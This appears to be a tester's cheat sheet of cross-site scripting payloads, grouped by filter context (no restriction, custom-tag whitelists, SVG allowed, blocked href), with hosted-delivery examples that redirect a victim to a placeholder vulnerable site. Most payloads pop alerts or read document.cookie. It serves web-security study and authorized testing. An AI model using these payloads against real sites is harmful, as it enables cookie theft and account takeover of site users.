When testing for `reflected` and `stored XSS`, a key task is to identify the `XSS context`:
- The location within the response where attacker-controllable data appears.
- Any input validation or other processing that is being performed on that data by the application.
Based on these details, you can then select one or more candidate XSS payloads, and test whether they are effective.

### Tips:
1. Start small, from 1 payload, troubleshoot until it work
2. If the target blocks certain tags, then fuzz with [cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
3. URL encode special chars when hosting your payload.


---

# XSS between HTML tags

When the XSS context is text between HTML tags, you need to introduce some new HTML tags designed to trigger execution of JavaScript.

Some useful ways of executing JavaScript are:
```
"><svg/onload=confirm(1)>
<script>alert(document.domain)</script>
<img src=1 onerror=alert(1)>
```

### 1. No restriction
```html
<script>alert(1)</script>
<script>alert(document.domain)</script>
<img src=1 onerror=alert(1)>
```

### 2. Weak restriction
```html
"><body onresize=print()>


# Hosted Payload:

<iframe src="https://VULN-WEB/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```

### 3. Custom tags whitelist
```html
<xss tabindex=0 autofocus onfocus=alert(1)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<body onload=alert(1)>  <!-- comparison: onload is the "normal" auto-fire vector -->
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>click</text></a></svg>
```

```html
# Hosted Payload:

# <xss tabindex=0 autofocus onfocus=alert(document.cookie)>
<script>
location = 'https://vuln-web/?search=%3Cxss+tabindex%3D0+autofocus+onfocus%3Dalert%28document.cookie%29%3E';
</script>

# <xss id=x onfocus=alert(document.cookie) tabindex=1>#x
<script>
location = 'https://vuln-web/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
```

### 4. SVG allowed
```html
<svg><animatetransform onbegin=alert(1)>
<svg><animatetransform onbegin=alert(document.cookie) attributeName=transform>
<svg><animatetransform onend=alert(document.cookie) attributeName=transform dur=1s>
<div><svg><animatetransform onbegin=alert(document.cookie) attributeName=transform></svg></div>
```

### 5. Clickbait with href blocked
```html
<svg><a><animate attributeName=href values=javascript:alert(document.cookie) /><text x=20 y=20>Click me</text></a></svg>
```

```html
<svg>
  <a>
    <animate attributeName=href values=javascript:alert(document.cookie) />
    <text x=20 y=20>Click me</text>
  </a>
</svg>
```
